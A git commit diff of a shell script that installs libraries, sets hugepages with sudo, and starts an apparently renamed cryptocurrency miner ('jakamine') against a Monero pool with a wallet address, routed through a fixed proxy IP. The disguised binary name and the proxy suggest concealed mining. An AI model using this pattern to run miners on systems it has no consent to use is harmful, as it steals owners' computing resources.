f218595e0c55b3ef7436d90177b0ecab89740c68
Dadora-Lee <dadorasoft@gmail.com>
2025-05-16 15:35:48 +0900

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,3 @@
 sudo apt install libuv1-dev libssl-dev libhwloc-dev -y
 sudo sysctl -w vm.nr_hugepages=1280
-/home/user/jakami/jakamine -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_E2B -k --proxy=98.175.31.195:4145
+/home/user/mine/jakamine -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_E2B -k --proxy=98.175.31.195:4145
